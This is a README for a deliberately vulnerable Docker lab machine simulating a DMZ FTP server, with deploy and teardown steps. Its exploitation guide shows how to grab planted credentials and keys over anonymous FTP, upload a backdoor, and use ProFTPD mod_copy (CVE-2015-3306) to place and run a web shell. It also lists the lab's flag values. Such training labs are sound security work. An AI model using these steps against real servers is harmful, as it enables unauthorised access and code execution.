# 🏢 VulnCorp — Machine 3: dmz-ftp01 (FTP Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 3 in the VulnCorp Enterprise testbed simulates an FTP server in the **DMZ Zone (`10.10.10.30`)** featuring **vsftpd Anonymous Upload/Write**, **ProFTPD `mod_copy` RCE (CVE-2015-3306 simulation)**, and leaked internal assets.

---

## 🚀 Quick Start (One-Command Deploy)

Run this on your **Ubuntu / Debian VM** (tested on Ubuntu 24.04):

```bash
# 1. Clone the repo to your VM
git clone https://github.com/sowmyacs25/Webserver.git

# 2. Enter the FTP machine folder
cd Webserver/machines/dmz-ftp01

# 3. Make the deploy script executable
chmod +x deploy.sh

# 4. Deploy (installs Docker if missing, cleans old cache, builds, starts)
sudo ./deploy.sh
```

---

## 🛠️ Manual Deploy (Step-by-Step)

If you prefer to run each step yourself, or `deploy.sh` fails for any reason:

```bash
# 1. Navigate into the machine folder
cd Webserver/machines/dmz-ftp01

# 2. Stop and remove any previous container, image, and volume for this machine
#    (prevents leftover state from breaking the new build)
sudo docker compose down --rmi all --volumes --remove-orphans

# 3. Wipe Docker's build cache completely
#    (forces every layer to rebuild from scratch — no stale Dockerfile sneaks in)
sudo docker builder prune -af

# 4. Remove any unused containers, networks, and dangling images globally
#    (frees disk space and prevents port/name conflicts)
sudo docker system prune -af

# 5. Build the image from the Dockerfile without using any cached layers
sudo docker compose build --no-cache

# 6. Start the container in detached mode (runs in the background)
sudo docker compose up -d

# 7. Tail the startup logs — you should see all 4 services LISTENING
sudo docker compose logs
```

### Why each cleanup command matters

| Command | What it does | Why we need it |
|---|---|---|
| `docker compose down --rmi all --volumes --remove-orphans` | Stops and removes the container, its image, its volumes, and any leftover "orphan" containers from old versions | Prevents leftover state from a previous broken build affecting the new one |
| `docker builder prune -af` | Deletes **all** cached build layers | If a layer from an old broken Dockerfile is cached, Docker reuses it and you get the same error again — this wipes it |
| `docker system prune -af` | Removes stopped containers, unused networks, dangling images | Frees disk space and prevents port/name conflicts on future deploys |
| `docker compose build --no-cache` | Builds the image **ignoring all cache** | Guarantees the build uses the current Dockerfile, not a cached older one |
| `docker compose up -d` | Starts the container in the background | `-d` = detached, so you get your terminal back |

> **Note:** `sudo` is required unless your user is in the `docker` group.
> To add yourself: `sudo usermod -aG docker $USER`, then log out and back in.

---

## 📡 Exposed Ports & Services

| Service | Port | Description | Vulnerability |
|---------|------|-------------|---------------|
| **vsftpd** | `21` | vsftpd 2.3.4 banner | **Anonymous Write Enabled** (`anon_upload_enable=YES`) |
| **ProFTPD** | `2121` | ProFTPD Standalone | **`mod_copy` RCE** (`SITE CPFR` / `SITE CPTO`) |
| **HTTP** | `80` | Apache Web Server | Web root can be written to via ProFTPD mod_copy |
| **SSH** | `2222` | OpenSSH | Root login allowed |
| **FTP Passive** | `40000-40100` | Passive data ports | Data transfer |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. Anonymous FTP Login & Information Gathering

```bash
ftp 10.10.10.30 21
# Name: anonymous
# Password: <press enter>
ftp> cd pub
ftp> ls -la
# Download sensitive files:
ftp> get network_map.txt
ftp> get db_credentials.txt
ftp> get employee_list.csv
ftp> cd keys
ftp> get backup_rsa
```

### 2. Anonymous Write (File Upload)

```bash
ftp 10.10.10.30 21
ftp> cd pub
ftp> put my_backdoor.sh
```

### 3. ProFTPD `mod_copy` Unauthenticated File Copy (RCE)

```bash
telnet 10.10.10.30 2121
SITE CPFR /var/ftp/pub/my_backdoor.php
SITE CPTO /var/www/html/shell.php
# Then execute via web:
curl http://10.10.10.30/shell.php
```

---

## 🏆 Flags

- **Anonymous FTP Write Flag:** `/var/ftp/pub/flag1.txt` (`VULN{anon_ftp_wr1t3}`)
- **Leaked SSH Key Flag:** `/var/ftp/pub/keys/flag.txt` (`VULN{ssh_k3y_l3ak3d}`)
- **Root Flag:** `/root/root.txt` (`VULN{ftp_s3rv3r_r00t3d_m4ch1n3_3}`)

---

## 🧹 Teardown & Cleanup

Stop the container, remove the built image and volumes, and wipe the build cache:

```bash
# Stop and remove the container + its image + its volumes
sudo docker compose down --rmi all --volumes

# Optional: clear Docker's build cache to free disk space
sudo docker builder prune -af

# Optional: remove all unused containers, networks, images globally
sudo docker system prune -af
```